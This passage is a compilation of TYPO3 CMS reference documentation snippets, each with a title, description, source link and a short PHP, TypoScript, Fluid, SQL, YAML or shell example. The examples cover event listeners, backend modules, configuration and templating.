function getController(): \\TYPO3\\CMS\\FrontendLogin\\Controller\\LoginController\n    {\n        // Implementation not shown\n    }\n\n    public function getView(): \\TYPO3\\CMS\\Core\\View\\ViewInterface\n    {\n        // Implementation not shown\n    }\n\n    public function getRequest(): \\Psr\\Http\\Message\\ServerRequestInterface\n    {\n        // Implementation not shown\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Using PageInformation DTO in TYPO3 Frontend Event\nDESCRIPTION: Examples showing how to use getPageInformation() and setPageInformation() methods when working with the AfterPageWithRootLineIsResolvedEvent in TYPO3 CMS version 13.0 and above.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Frontend/AfterPageWithRootLineIsResolvedEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n\\TYPO3\\CMS\\Frontend\\Event\\AfterPageWithRootLineIsResolvedEvent\n```\n\n----------------------------------------\n\nTITLE: Defining EntityAddedToPersistenceEvent Class in TYPO3 Extbase Persistence\nDESCRIPTION: This code snippet defines the EntityAddedToPersistenceEvent class in the TYPO3 Extbase persistence system. The event is triggered after an entity is sent to the persistence layer for addition but before updating the reference index and current session. It includes a getObject() method that returns the domain object being persisted.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Extbase/EntityAddedToPersistenceEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Extbase\\Event\\Persistence;\n\nclass EntityAddedToPersistenceEvent\n{\n    public function getObject(): \\TYPO3\\CMS\\Extbase\\DomainObject\\DomainObjectInterface;\n}\n```\n\n----------------------------------------\n\nTITLE: Including TSconfig Files in TYPO3\nDESCRIPTION: This snippet shows how to import TSconfig files for the link browser configuration from a specific directory in an extension.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/LinkHandling/Tutorials/RecordLinkBrowser.rst#2025-04-16_snippet_0\n\nLANGUAGE: typoscript\nCODE:\n```\n@import 'EXT:examples/Configuration/TsConfig/Page/LinkBrowser/*.tsconfig'\n```\n\n----------------------------------------\n\nTITLE: Configuring System Maintainers in TYPO3 Settings\nDESCRIPTION: Shows how to manually configure system maintainers by adding their user UIDs in the system settings. These users can access admin tools without additional security measures.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Security/GuidelinesIntegrators/InstallTool.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n<?php\nreturn [\n    // ...\n    'SYS' => [\n        'systemMaintainers' => [1, 7, 36],\n        // ...\n    ],\n];\n```\n\n----------------------------------------\n\nTITLE: Implementing TYPO3 MeowInformationCommand Class in PHP\nDESCRIPTION: Defines a command class that extends the base Command class and uses constructor dependency injection to handle meow information requests and logging. The class is marked as final and uses PHP 8.0+ constructor property promotion syntax.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Tutorials/Command/Classes/DependencyInjection.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nuse Psr\\Log\\LoggerInterface;\nuse T3docs\\Examples\\Http\\MeowInformationRequester;\n\nfinal class MeowInformationCommand extends Command\n{\n    public function __construct(\n        private readonly MeowInformationRequester $requester,\n        private readonly LoggerInterface $logger,\n    ) {\n        parent::__construct();\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Info Module Content Modification Event Listener in PHP\nDESCRIPTION: Example event listener implementation that modifies the content of the TYPO3 Info module. The listener adds custom header content based on the current submodule and access permissions.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Info/ModifyInfoModuleContentEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Info\\EventListener;\n\nuse TYPO3\\CMS\\Info\\Controller\\Event\\ModifyInfoModuleContentEvent;\n\nfinal class MyEventListener\n{\n    public function __invoke(ModifyInfoModuleContentEvent $event): void\n    {\n        // Only add content if user has access to module\n        if (!$event->hasAccess()) {\n            return;\n        }\n\n        // Only add content for specific submodule\n        if ($event->getCurrentModule() === 'web_info_pagetsconfig') {\n            $event->setHeaderContent(\n                $event->getHeaderContent() . '<p>My additional header content</p>'\n            );\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: PHP Event Listener Implementation for Country Addition\nDESCRIPTION: Event listener class that demonstrates adding a new country 'Magic Kingdom' to the TYPO3 country list with alpha codes 'XX' and 'XXX'.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/Country/BeforeCountriesEvaluatedEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Country\\EventListener;\n\nuse TYPO3\\CMS\\Core\\Country\\Country;\nuse TYPO3\\CMS\\Core\\Country\\Event\\BeforeCountriesEvaluatedEvent;\n\nfinal class MyEventListener\n{\n    public function __invoke(BeforeCountriesEvaluatedEvent $event): void\n    {\n        $countries = $event->getCountries();\n        $countries[] = new Country('XX', 'XXX', 'Magic Kingdom');\n        $event->setCountries($countries);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Injecting ModuleTemplateFactory in Extbase Backend Controller\nDESCRIPTION: This snippet shows how to set up a backend controller by extending ActionController, applying the AsController attribute, and injecting the ModuleTemplateFactory via constructor injection.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/BackendModule/CreateModuleWithExtbase.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nuse TYPO3\\CMS\\Backend\\Attribute\\AsController;\nuse TYPO3\\CMS\\Backend\\Template\\ModuleTemplateFactory;\nuse TYPO3\\CMS\\Extbase\\Mvc\\Controller\\ActionController;\n\n#[AsController]\nfinal class MyController extends ActionController\n{\n    public function __construct(\n        protected readonly ModuleTemplateFactory $moduleTemplateFactory,\n    ) {\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating a New Column in an Existing Table - SQL\nDESCRIPTION: This SQL snippet demonstrates how to add a new column named tx_myextension_field to the existing pages table in TYPO3. The syntax follows TYPO3's conventions for extending database schema definitions in the ext_tables.sql file.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/FileStructure/ExtTablesSql.rst#2025-04-16_snippet_0\n\nLANGUAGE: sql\nCODE:\n```\nCREATE TABLE pages (\n    tx_myextension_field int(11) DEFAULT '0' NOT NULL,\n);\n```\n\n----------------------------------------\n\nTITLE: Using Custom ViewHelpers in Fluid\nDESCRIPTION: Shows how to use a custom ViewHelper within a specific namespace in a Fluid template.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fluid/Syntax.rst#2025-04-16_snippet_14\n\nLANGUAGE: html\nCODE:\n```\n<blog:custom argument1=\"something\"/>\n```\n\n----------------------------------------\n\nTITLE: Accessing Array Elements in Fluid Templates\nDESCRIPTION: Demonstrates how to access array elements using the dot notation in a Fluid template.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fluid/Syntax.rst#2025-04-16_snippet_9\n\nLANGUAGE: html\nCODE:\n```\n<p>{data.0}, {data.1}</p>\n```\n\n----------------------------------------\n\nTITLE: Importing TypoScript for Backward Compatibility\nDESCRIPTION: This TypoScript snippet demonstrates how to import the main TypoScript setup file from the `Configuration/TypoScript` directory for backward compatibility reasons when using site sets in TYPO3. It ensures that existing TypoScript configurations are still loaded when the set is activated.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/FileStructure/Configuration/Sets/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: typoscript\nCODE:\n```\n\"# For backward compatibility reasons setup.typoscript was not moved\n@import 'EXT:my_extension/Configuration/TypoScript/setup.typoscript'\"\n```\n\n----------------------------------------\n\nTITLE: Referencing TYPO3 Service Methods in PHP\nDESCRIPTION: This snippet demonstrates the method signatures required for the 'auth' service type in TYPO3. It shows that custom service types should define their own API with specific required methods.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Services/Developer/NewServiceType.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\ngetUser()\nauthUser()\n```\n\n----------------------------------------\n\nTITLE: Cleaning Up All Module Data in TYPO3\nDESCRIPTION: This method cleans up all module data based on a provided list of allowed data. It's typically called with $MOD_MENU and returns a boolean indicating if any cleaning was performed.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Manual/Entity/ModuleData.rst.txt#2025-04-16_snippet_7\n\nLANGUAGE: php\nCODE:\n```\n..  php:method:: cleanUp(array $allowedData, bool $useKeys = true)\n        :returns: `bool`\n\n        Cleans up all module data, which are defined in the\n        given allowed data list. Usually called with $MOD_MENU.\n\n        :param $allowedData: the allowedData\n        :param $useKeys: the useKeys, default: true\n```\n\n----------------------------------------\n\nTITLE: Implementing AfterMailerSentMessageEvent Listener in PHP\nDESCRIPTION: This code snippet demonstrates how to implement a listener for the AfterMailerSentMessageEvent in TYPO3 CMS. It shows the class structure and method for handling the event, including accessing the sent message and its details.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/Mail/AfterMailerSentMessageEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Mail\\EventListener;\n\nuse TYPO3\\CMS\\Core\\Mail\\Event\\AfterMailerSentMessageEvent;\n\nfinal class MyEventListener\n{\n    public function __invoke(AfterMailerSentMessageEvent $event): void\n    {\n        $sentMessage = $event->getSentMessage();\n        $originalMessage = $sentMessage->getOriginalMessage();\n        // Do something with the sent message\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: TYPO3 Site Configuration Change Handler\nDESCRIPTION: Method to handle site configuration changes. No parameters or return type specified in the documentation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Manual/Core/SiteFinder.rst.txt#2025-04-16_snippet_3\n\nLANGUAGE: PHP\nCODE:\n```\nsiteConfigurationChanged()\n```\n\n----------------------------------------\n\nTITLE: Removing Specific Meta Tag Property in PHP\nDESCRIPTION: Demonstrates how to remove a specific meta tag property using the MetaTag API.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Seo/MetaTagApi.rst#2025-04-16_snippet_2\n\nLANGUAGE: PHP\nCODE:\n```\nuse TYPO3\\CMS\\Core\\MetaTag\\MetaTagManagerRegistry;\nuse TYPO3\\CMS\\Core\\Utility\\GeneralUtility;\n\n$metaTagManager = GeneralUtility::makeInstance(MetaTagManagerRegistry::class)->getManagerForProperty('og:title');\n$metaTagManager->removeProperty('og:title');\n```\n\n----------------------------------------\n\nTITLE: Resetting User Password via CLI in Composer-based TYPO3 Installation\nDESCRIPTION: Command for administrators to reset a user's password in a Composer-based TYPO3 installation, requiring the backend URL and user's email address.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/AccessControl/PasswordReset/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\nvendor/bin/typo3 backend:resetpassword https://example.com/typo3/ editor@example.com\n```\n\n----------------------------------------\n\nTITLE: Implementing Backend Module Controller in TYPO3 CMS\nDESCRIPTION: This code snippet defines the ModuleController class, which handles backend module actions in TYPO3 CMS. It includes methods for generating links, rendering views, and managing dependencies through dependency injection.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/_UriBuilder/_LinksAction.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nuse Psr\\Http\\Message\\ResponseInterface;\nuse Psr\\Http\\Message\\UriInterface;\nuse Psr\\Log\\LoggerInterface;\nuse T3docs\\Examples\\Service\\TableInformationService;\nuse TYPO3\\CMS\\Backend\\Routing\\UriBuilder;\nuse TYPO3\\CMS\\Backend\\Template\\ModuleTemplateFactory;\nuse TYPO3\\CMS\\Core\\Configuration\\ExtensionConfiguration;\nuse TYPO3\\CMS\\Core\\Crypto\\PasswordHashing\\PasswordHashFactory;\nuse TYPO3\\CMS\\Core\\Database\\ConnectionPool;\nuse TYPO3\\CMS\\Core\\Imaging\\IconFactory;\nuse TYPO3\\CMS\\Core\\Resource\\FileRepository;\nuse TYPO3\\CMS\\Core\\Resource\\ResourceFactory;\n\nclass ModuleController extends ActionController\n{\n    public function linksAction(): ResponseInterface\n    {\n        $pageUid = (int)($this->request->getQueryParams()['id'] ?? 0);\n        $returnUrl = (string)$this->backendUriBuilder->buildUriFromRoute(\n            'web_examples',\n            ['id' => $pageUid, 'action' => 'links'],\n        );\n\n        $editPage1Link = $this->getEditPageLink(1, $returnUrl);\n        $editPagesDoktypeLink = $this->getEditDoktypeLink($returnUrl);\n        $createHaikuLink = $this->getCreateHaikuLink($returnUrl);\n\n        $view = $this->initializeModuleTemplate($this->request);\n        $view->assignMultiple(\n            [\n                'editPage1Link' => $editPage1Link,\n                'editPagesDoktypeLink' => $editPagesDoktypeLink,\n                'createHaikuLink' => $createHaikuLink,\n                'returnUrl' => $returnUrl,\n            ],\n        );\n        return $view->renderResponse();\n    }\n\n    private function getEditPageLink(int $uid, string $returnUrl): UriInterface\n    {\n        $uriParameters = [\n            'edit' => [\n                'pages' => [\n                    $uid => 'edit',\n                ],\n            ],\n            'returnUrl' => $returnUrl,\n        ];\n        return $this->backendUriBuilder->buildUriFromRoute(\n            'record_edit',\n            $uriParameters,\n        );\n    }\n\n    public function __construct(\n        protected readonly ModuleTemplateFactory $moduleTemplateFactory,\n        protected readonly IconFactory $iconFactory,\n        protected readonly ExtensionConfiguration $extensionConfiguration,\n        protected readonly PasswordHashFactory $passwordHashFactory,\n        protected readonly ResourceFactory $resourceFactory,\n        protected readonly FileRepository $fileRepository,\n        protected readonly ConnectionPool $connectionPool,\n        protected readonly TableInformationService $tableInformationService,\n        protected readonly LoggerInterface $logger,\n        protected readonly UriBuilder $backendUriBuilder,\n    ) {}\n}\n```\n\n----------------------------------------\n\nTITLE: Setting Modified Query Object in ModifyQueryBeforeFetchingObjectDataEvent in PHP\nDESCRIPTION: Method to set a modified query object in the event. Takes a QueryInterface instance as parameter, allowing event listeners to replace the original query with a modified version before it's executed.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Extbase/ModifyQueryBeforeFetchingObjectDataEvent.rst.txt#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\nsetQuery(\\TYPO3\\CMS\\Extbase\\Persistence\\QueryInterface $query)\n```\n\n----------------------------------------\n\nTITLE: Defining ModuleData Class in TYPO3 CMS Backend\nDESCRIPTION: This snippet defines the ModuleData class, a DTO for managing user-specific module settings in TYPO3 CMS backend. It is created in the BackendModuleValidator middleware and added to the PSR-7 Request for use in various components.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Manual/Entity/ModuleData.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n..  php:namespace::  TYPO3\\CMS\\Backend\\Module\n\n..  php:class:: ModuleData\n\n    A simple DTO containing the user specific module settings, e.g. whether the clipboard is shown.\n\n    The DTO is created in the PSR-15 middleware BackendModuleValidator, in case a backend module\n    is requested and the user has necessary access permissions. The created DTO is then added as\n    attribute to the PSR-7 Request and can be further used in components, such as middlewares or\n    the route target (usually a backend controller).\n```\n\n----------------------------------------\n\nTITLE: Setting Generic TYPO3 Service Configuration\nDESCRIPTION: Shows the recommended syntax for configuring service type options in TYPO3. This configuration is meant for code that uses services rather than for the services themselves.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Services/Configuration/ServiceTypeConfiguration.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['SVCONF'][service type]['setup'][config key] = value;\n```\n\n----------------------------------------\n\nTITLE: Generating Plugin Signature in PHP\nDESCRIPTION: Demonstrates how to generate a plugin signature by combining extension name and plugin name\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/BestPractises/NamingConventions.rst#2025-04-16_snippet_4\n\nLANGUAGE: php\nCODE:\n```\n$extensionName = 'my_extension';\n$pluginName = 'MyCoolPlugin';\n$pluginSignature = \"myextension_mycoolplugin\"\n```\n\n----------------------------------------\n\nTITLE: Default Page Template in HTML\nDESCRIPTION: Illustrates a default page template in a TYPO3 site package, showing how to include layouts and partials.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fluid/Introduction.rst#2025-04-16_snippet_6\n\nLANGUAGE: html\nCODE:\n```\n<f:layout name=\"PageLayout\" />\n<f:section name=\"Main\">\n    <main>\n        <f:render partial=\"Content\" arguments=\"{_all}\" />\n    </main>\n</f:section>\n```\n\n----------------------------------------\n\nTITLE: Defining TYPO3 Installation Guide Structure in reStructuredText\nDESCRIPTION: This snippet defines the structure of the TYPO3 installation guide using reStructuredText syntax. It includes a card grid layout to present different sections of the guide and a hidden table of contents for navigation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Installation/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: reStructuredText\nCODE:\n```\n..  include:: /Includes.rst.txt\n\n..  index:: installation\n\n..  _installation_index:\n\n============\nInstallation\n============\n\n..  card-grid::\n    :columns: 1\n    :columns-md: 2\n    :gap: 4\n    :class: pb-4\n    :card-height: 100\n\n    ..  card:: :ref:`System requirements <system-requirements>`\n\n        System requirements for the host operating system, including its web\n        server and database and how they should be configured prior to\n        installation.\n\n    ..  card:: :ref:`Installing TYPO3 <installation>`\n\n        The Installation Guide covers everything needed to install TYPO3. Including a preinstallation\n        checklist and a detailed walk through that details every step of the installation process.\n\n    ..  card:: :ref:`Deploying TYPO3 <DeployTYPO3>`\n\n        The deployment guide highlights some of solutions available that can help automate the process of deploying TYPO3 to\n        a remote server.\n\n    ..  card:: :ref:`Tuning TYPO3 <TuneTYPO3>`\n\n        This chapter contains information on how to configure and optimize the infrastructure running TYPO3.\n\n    ..  card:: :ref:`TYPO3 Release Integrity <release_integrity>`\n\n        Every release of TYPO3 is electronically signed by the TYPO3 release team.\n        In addition, every TYPO3 package also contains a unique file hash that\n        can be used to ensure file integrity when downloading the release. This guide\n        details how these signatures can be checked and how file hashes can be compared.\n\n    ..  card:: :ref:`Legacy Installation Guide <legacyinstallation>`\n\n        Looking to install TYPO3 the classic way? Whilst this method of installation is no longer recommended, the Legacy Installation\n        Guide demonstrates how TYPO3 can be installed without using Composer.\n\n..  toctree::\n    :hidden:\n    :titlesonly:\n\n    SystemRequirements/Index\n    Install\n    EnvironmentConfiguration\n    ProductionSettings\n    TuneTYPO3\n    Deployment/Index\n    LegacyInstallation\n    LegacyExtensionInstallation\n```\n\n----------------------------------------\n\nTITLE: PHP Event Class Reference\nDESCRIPTION: Full PHP namespace path for the AfterFormEnginePageInitializedEvent class\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Backend/AfterFormEnginePageInitializedEvent.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\n\\TYPO3\\CMS\\Backend\\Controller\\Event\\AfterFormEnginePageInitializedEvent\n```\n\n----------------------------------------\n\nTITLE: Defining Tea Model Class in PHP for TYPO3 Extension\nDESCRIPTION: This code defines a Tea class that extends AbstractEntity. It includes a protected title property and methods to get and set the title. This class is part of the TTN\\Tea\\Domain\\Model namespace.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Tutorials/Tea/Classes/Domain/Model/TeaTitle.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nclass Tea extends AbstractEntity\n{\n    protected string $title = '';\n\n    public function getTitle(): string\n    {\n        return $this->title;\n    }\n\n    public function setTitle(string $title): void\n    {\n        $this->title = $title;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Extbase Controller Localization\nDESCRIPTION: Example of implementing localization in an Extbase controller using LocalizationUtility.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/Localization/Php.rst#2025-04-16_snippet_3\n\nLANGUAGE: php\nCODE:\n```\npublic function editConfirmationAction(): ResponseInterface\n{\n    $this->addFlashMessage(\n        LocalizationUtility::translate(\n            'alert.token.updated',\n            'my_extension',\n            [\n                'backend',\n                $this->editApiToken?->getAccessToken() ?? '',\n            ]\n        ),\n        '',\n        \\TYPO3\\CMS\\Core\\Type\\ContextualFeedbackSeverity::OK\n    );\n    return new RedirectResponse($this->uriBuilder->uriFor('edit'));\n}\n```\n\n----------------------------------------\n\nTITLE: PHP Class Reference Declaration\nDESCRIPTION: Reference to the PHP class path for ModifyButtonBarEvent in TYPO3 backend\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Backend/ModifyButtonBarEvent.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n\\TYPO3\\CMS\\Backend\\Template\\Components\\ModifyButtonBarEvent\n```\n\n----------------------------------------\n\nTITLE: Adding Custom Stylesheets to TYPO3 Backend\nDESCRIPTION: This snippet demonstrates how to add custom stylesheets to the TYPO3 backend interface using the `$GLOBALS['TYPO3_CONF_VARS']['BE']['stylesheets']` array.  It provides examples for adding a specific stylesheet or all stylesheets from a folder within an extension.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/Typo3ConfVars/BE.rst#2025-04-16_snippet_4\n\nLANGUAGE: php\nCODE:\n```\n\"$GLOBALS['TYPO3_CONF_VARS']['BE']['stylesheets']['my_extension']\n    = 'EXT:my_extension/Resources/Public/Css/myfile.css';\"\n```\n\nLANGUAGE: php\nCODE:\n```\n\"$GLOBALS['TYPO3_CONF_VARS']['BE']['stylesheets']['my_extension']\n    = 'EXT:my_extension/Resources/Public/Css/';\"\n```\n\n----------------------------------------\n\nTITLE: Checking Table Read Access in TYPO3\nDESCRIPTION: Checks if the backend user has read access to the 'tt_content' table.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/BackendUserObject.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['BE_USER']->check('tables_select', 'tt_content');\n```\n\n----------------------------------------\n\nTITLE: Configuring LinkHandler for News Records in Page TSconfig\nDESCRIPTION: This Page TSconfig example demonstrates how to configure a LinkHandler for news records from a specific storage page. It hides the page tree and sets up display options.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/LinkHandling/Linkhandler/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: typoscript\nCODE:\n```\nTCEMAIN.linkHandler.news {\n    handler = TYPO3\\CMS\\Backend\\LinkHandler\\RecordLinkHandler\n    label = News\n    configuration {\n        table = tx_news_domain_model_news\n        storagePid = 123\n        hidePageTree = 1\n    }\n    displayAfter = email\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Custom Guzzle Middleware Handlers in TYPO3\nDESCRIPTION: Configuration example for adding custom middleware handlers to the default Guzzle handler stack in TYPO3's system configuration.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/RestRequests/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n// Add custom middlewares to default Guzzle handler stack\n$GLOBALS['TYPO3_CONF_VARS']['HTTP']['handler'][] =\n    (\\TYPO3\\CMS\\Core\\Utility\\GeneralUtility::makeInstance(\n        \\MyVendor\\MyExtension\\Middleware\\Guzzle\\CustomMiddleware::class\n    ))->handler();\n$GLOBALS['TYPO3_CONF_VARS']['HTTP']['handler'][] =\n    (\\TYPO3\\CMS\\Core\\Utility\\GeneralUtility::makeInstance(\n        \\MyVendor\\MyExtension\\Middleware\\Guzzle\\SecondCustomMiddleware::class\n    ))->handler();\n```\n\n----------------------------------------\n\nTITLE: RST Section Header Definition\nDESCRIPTION: Defines the main section header for page-based routing documentation using RST syntax.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Routing/PageBasedRouting.rst#2025-04-16_snippet_1\n\nLANGUAGE: rst\nCODE:\n```\n==================\nPage-based routing\n==================\n```\n\n----------------------------------------\n\nTITLE: CSP Configuration Example for example.com\nDESCRIPTION: YAML configuration defining Content Security Policy rules for example.com domain\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/ContentSecurityPolicy/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\n# config/sites/example-com/csp.yaml\nsections:\n  frontend:\n    # CSP directives\n\n```\n\n----------------------------------------\n\nTITLE: Creating Record Localizations in TYPO3 Workspace\nDESCRIPTION: CSV table demonstrating the database representation of creating localizations for a record in different languages within a TYPO3 workspace. It shows the relationship between the original record and its translations.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Workspaces/Index.rst#2025-04-16_snippet_10\n\nLANGUAGE: csv\nCODE:\n```\nuid,pid,deleted,sorting,t3ver_wsid,t3ver_oid,t3ver_state,l10n_parent,sys_language_uid,title\n11,20,0,128,0,0,0,0,0,Article #1\n...,...,...,...,...,...,...,...,...,...,...\n31,20,0,192,1,1,0,11,1,Entrefilet #1 (fr)\n32,-1,0,192,1,31,-1,11,1,Entrefilet #1 (fr)\n33,20,0,224,1,0,1,11,2,Beitrag #1 (de)\n34,-1,0,224,1,33,-1,11,2,Beitrag #1 (de)\n```\n\n----------------------------------------\n\nTITLE: Configuring Session-Based Authentication in TYPO3\nDESCRIPTION: Settings to trigger authentication process only when a valid session doesn't exist. Useful for scenarios like single sign-on portals where continuous re-authentication isn't needed.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Authentication/AuthenticationService/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['SVCONF']['auth']['setup']['BE_fetchUserIfNoSession'] = true;\n$GLOBALS['TYPO3_CONF_VARS']['SVCONF']['auth']['setup']['FE_fetchUserIfNoSession'] = true;\n```\n\n----------------------------------------\n\nTITLE: Function with Parameter Validation\nDESCRIPTION: Showcases a function with early return for parameter validation and multiple return paths\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodingGuidelines/CglPhp/PhpSyntaxFormatting.rst#2025-04-16_snippet_28\n\nLANGUAGE: php\nCODE:\n```\nfunction extendedUse(bool $enabled, MyUseParameters $useParameters): string\n{\n    // Validation\n    if (count($useParameters->urlParts) < 5) {\n        return 'Parameter validation failed';\n    }\n\n    // Main functionality\n    $content = '';\n    if ($enabled) {\n        $content = 'Extended use';\n    } else {\n        $content = 'Only basic use is available to you!';\n    }\n    return $content;\n}\n```\n\n----------------------------------------\n\nTITLE: Defining ModifyUrlForCanonicalTagEvent Class in TYPO3 CMS SEO Module\nDESCRIPTION: This code snippet defines the ModifyUrlForCanonicalTagEvent class in the TYPO3\\CMS\\Seo\\Event namespace. It is a PSR-14 event used to alter or empty a canonical URL for the href attribute of a canonical URL tag.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Seo/ModifyUrlForCanonicalTagEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n..  php:namespace::  TYPO3\\CMS\\Seo\\Event\n\n..  php:class:: ModifyUrlForCanonicalTagEvent\n\n    PSR-14 event to alter (or empty) a canonical URL for the href=\"\" attribute of a canonical URL.\n```\n\n----------------------------------------\n\nTITLE: HTML Modal Trigger with Static Backdrop\nDESCRIPTION: HTML example demonstrating how to create a modal trigger with a static backdrop using data attributes to prevent closing when clicking outside.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/JavaScript/Modules/Modals.rst#2025-04-16_snippet_6\n\nLANGUAGE: 